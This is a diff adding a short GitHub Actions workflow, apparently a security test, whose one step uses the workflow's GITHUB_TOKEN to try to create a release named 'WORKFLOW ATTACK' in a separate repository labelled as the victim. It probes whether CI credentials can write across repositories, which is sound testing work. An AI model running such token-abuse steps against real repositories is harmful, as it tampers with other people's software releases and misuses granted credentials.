@@ -1,0 +1,14 @@
+name: Cross Repo Release Test
+on: [workflow_dispatch]
+jobs:
+  test-cross-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try to create release on victim repo
+        run: |
+          RESP=$(curl -s -w "\n%{http_code}" -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/apexblack-kangaroo-1782761273/chainship-victim-repo/releases" \
+            -d '{"tag_name":"v-workflow-attack-1783405724","name":"WORKFLOW ATTACK"}')
+          echo "$RESP"
